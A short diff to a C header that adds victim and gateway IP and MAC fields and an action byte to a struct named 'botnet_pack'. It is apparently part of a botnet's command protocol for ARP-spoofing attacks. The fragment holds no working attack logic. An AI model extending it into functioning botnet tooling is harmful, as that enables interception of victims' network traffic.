@@ -26,6 +26,14 @@ struct network_adapter
 struct botnet_pack
 {
 	enum PACK_TYPE type;
+	
+	/*-----commnad-----*/
+	BYTE act;
+	ULONG32 gateway_ip;
+	ULONG32 victim_ip;
+	BYTE gateway_mac[6];
+	BYTE victim_mac[6];
+	/*-----------------*/
 };
 
 #ifdef __cplusplus
